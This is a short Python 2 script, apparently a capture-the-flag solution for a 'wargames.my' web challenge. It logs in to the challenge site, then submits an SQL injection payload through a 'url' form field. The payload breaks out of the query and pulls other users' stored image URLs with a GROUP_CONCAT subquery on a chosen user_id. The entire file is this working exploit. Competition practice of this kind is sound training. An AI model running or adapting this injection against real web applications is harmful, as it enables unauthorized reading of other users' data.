import requests 
data = {
	"username":"Anonymous3",
	"password":"Anonymous3"
}
s = requests.Session()
s.post("http://fortnight1802.wargames.my:8001/login.php",data=data)

data = {
	"url":"http://'jpg',(SELECT GROUP_CONCAT(i.url) FROM image AS i WHERE user_id = 34))#.jpg"
}
print s.post("http://fortnight1802.wargames.my:8001/index.php",data=data).text.split("\n")[26]
# print s.get("http://fortnight1802.wargames.my:8001/index.php").text